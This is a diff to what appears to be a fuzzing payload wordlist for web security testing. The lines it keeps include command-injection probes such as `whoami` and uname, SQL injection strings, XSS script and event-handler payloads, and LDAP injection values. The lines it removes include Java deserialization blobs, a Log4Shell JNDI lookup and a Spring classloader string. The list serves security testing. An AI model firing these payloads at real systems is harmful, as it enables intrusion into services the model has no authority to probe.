@@ -1,21 +1,4 @@
-﻿*
-&
-%
-;
-[
-]
-(
-)
-|
-?
-\
-'
-\
-@
-#
-!
-.
-null
+﻿null
 $null
 `whoami`
 uname%20-a
@@ -40,22 +23,18 @@ cmd.exe
 &amp;
 &lt;
 &gt;
-n\nn
-r\rr
-s\\s           
+\n
+\r
+\s           
 1'
 1' or '1' = '1
 1' or '1' = '1')) LIMIT 1/*
 10 AND 1=2"
-<
 %3c
 %253c
-«
 +ADw-
->
 %3e
 %253e
-»
 +AD4-
 test><script>alert(1);</script>
 test" onfocus=alert(2) autofocus "
@@ -98,9 +77,3 @@ pwd)
 admin)(&)
 user=*)(uid=*))(|(uid=*
 test&foo=
-rO0ABX1////3
-rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c="
-rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=":
-${jndi:ldap://"+ip+"/a}
-${java:version}
-class.module.classLoader.URLs%5B0%5D=0
